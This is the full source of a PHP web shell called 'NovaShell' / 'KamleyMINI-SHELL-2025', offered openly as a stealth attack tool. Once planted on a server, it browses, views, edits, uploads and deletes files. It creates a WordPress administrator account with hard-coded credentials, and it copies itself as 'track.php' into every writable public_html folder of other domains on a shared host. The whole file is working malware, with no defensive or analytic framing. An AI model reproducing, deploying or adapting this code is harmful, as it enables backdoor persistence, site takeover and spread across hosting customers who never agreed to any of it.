<?php
// 🚀 KamleyMINI-SHELL-2025 — Stealth PHP Shell (WP Admin Injector + Replication)
error_reporting(0);

// === Main Vars ===
$basePath = getcwd();
$currentDir = isset($_GET['path']) ? realpath($_GET['path']) : $basePath;
if (!$currentDir || !is_dir($currentDir)) $currentDir = $basePath;

// ------------------ Utility Functions ------------------
function breadcrumbs($dir) {
    $parts = explode('/', trim($dir, '/'));
    $crumb = '/';
    $html = "<div class='crumbs'>📂 Path: ";
    foreach ($parts as $seg) {
        $crumb .= "$seg/";
        $html .= "<a href='?path=" . urlencode($crumb) . "'>$seg</a>/";
    }
    return $html . "</div>";
}

function listDirectory($dir) {
    $items = scandir($dir);
    $folders = $files = '';
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = "$dir/$item";
        if (is_dir($full)) {
            $folders .= "<li>📁 <a href='?path=" . urlencode($full) . "'>$item</a>
            <a class='red' href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete folder?\")'>[x]</a></li>";
        } else {
            $files .= "<li>📄 <a href='?path=" . urlencode($dir) . "&view=" . urlencode($item) . "'>$item</a> 
            <a class='edit' href='?path=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>[✏]</a> 
            <a class='red' href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete file?\")'>[x]</a></li>";
        }
    }
    return "<ul>$folders$files</ul>";
}

function replicateShell($code) {
    static $done = false;
    if ($done) return [];
    $done = true;
    $start = __DIR__;
    while ($start !== '/') {
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            $urls = [];
            foreach (scandir("$start/domains") as $dom) {
                if ($dom === '.' || $dom === '..') continue;
                $pub = "$start/domains/$dom/public_html";
                if (is_writable($pub)) {
                    $path = "$pub/track.php";
                    if (file_put_contents($path, $code)) {
                        $urls[] = "http://$dom/track.php";
                    }
                }
            }
            return $urls;
        }
        $start = dirname($start);
    }
    return [];
}

// ------------------ Actions ------------------

// Delete file/folder
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if (strpos($target, getcwd()) === 0 && file_exists($target)) {
        is_dir($target) ? rmdir($target) : unlink($target);
        echo "<p class='log red'>🗑️ Deleted: " . basename($target) . "</p>";
    }
}

// WP Admin Creator
if (isset($_GET['wp_admin'])) {
    $wppath = $currentDir;
    while ($wppath !== '/') {
        if (file_exists("$wppath/wp-load.php")) break;
        $wppath = dirname($wppath);
    }
    if (file_exists("$wppath/wp-load.php")) {
        require_once("$wppath/wp-load.php");
        $user = 'nova'; $pass = 'Nova@2025'; $mail = 'nova@galaxy.com';
        if (!username_exists($user) && !email_exists($mail)) {
            $uid = wp_create_user($user, $pass, $mail);
            $wp_user = new WP_User($uid);
            $wp_user->set_role('administrator');
            echo "<p class='log green'>✅ WP Admin 'nova' created</p>";
        } else {
            echo "<p class='log yellow'>⚠️ User or email exists</p>";
        }
    } else {
        echo "<p class='log red'>❌ WP not found</p>";
    }
}

// File view/edit
if (isset($_GET['view'])) {
    $f = basename($_GET['view']);
    echo "<h3>📄 Viewing: $f</h3><pre>" . htmlspecialchars(file_get_contents("$currentDir/$f")) . "</pre><hr>";
}

if (isset($_GET['edit'])) {
    $f = basename($_GET['edit']);
    $path = "$currentDir/$f";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($path, $_POST['content']);
        echo "<p class='log green'>✅ Saved</p>";
    }
    $src = htmlspecialchars(file_get_contents($path));
    echo "<h3>✏️ Edit: $f</h3>
        <form method='post'>
            <textarea name='content' rows='20'>$src</textarea><br>
            <button>💾 Save</button>
        </form><hr>";
}

// File Upload
if ($_FILES) {
    move_uploaded_file($_FILES['file']['tmp_name'], "$currentDir/" . basename($_FILES['file']['name']));
    echo "<p class='log green'>📤 Uploaded</p>";
}

// Create folder
if (!empty($_POST['folder'])) {
    $d = "$currentDir/" . basename($_POST['folder']);
    if (!file_exists($d)) {
        mkdir($d);
        echo "<p class='log green'>📁 Created</p>";
    } else {
        echo "<p class='log yellow'>⚠️ Exists</p>";
    }
}

// ------------------ UI ------------------
echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>NovaShell</title>
<style>
body { background:#000; color:#ddd; font-family:monospace; max-width:900px; margin:auto; padding:20px; }
a { color:#4cf; text-decoration:none; } a:hover { color:#8ff; }
ul { list-style:none; padding:0; }
textarea { width:100%; background:#111; color:#0f0; border:1px solid #333; }
button { background:#4cf; color:#000; padding:6px 12px; border:none; margin-top:5px; }
.red { color:#f44; }
.green { color:#4f4; }
.yellow { color:#ff4; }
.edit { color:#8cf; }
.crumbs { margin-bottom:10px; }
.log { padding:4px 0; }
</style></head><body>
<h2>🛸 NovaShell</h2>" . breadcrumbs($currentDir) . "<hr>";

// WP Admin Button
echo "<form method='get'>
    <input type='hidden' name='path' value='" . htmlspecialchars($currentDir) . "'>
    <button name='wp_admin' value='1'>👤 Create WP Admin</button>
</form><br>";

// Replication
if (basename(__FILE__) !== 'track.php') {
    $urls = replicateShell(file_get_contents(__FILE__));
    if (!empty($urls)) {
        echo "<p class='green'>✅ Cloned into:</p><ul>";
        foreach ($urls as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>";
        echo "</ul><hr>";
    }
}

// Upload & mkdir
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='file'> <button>Upload</button></form><br>
<form method='post'>
    📁 <input type='text' name='folder'> <button>Create Folder</button></form><br>";

// Explorer
echo listDirectory($currentDir);
echo "</body></html>";
?>
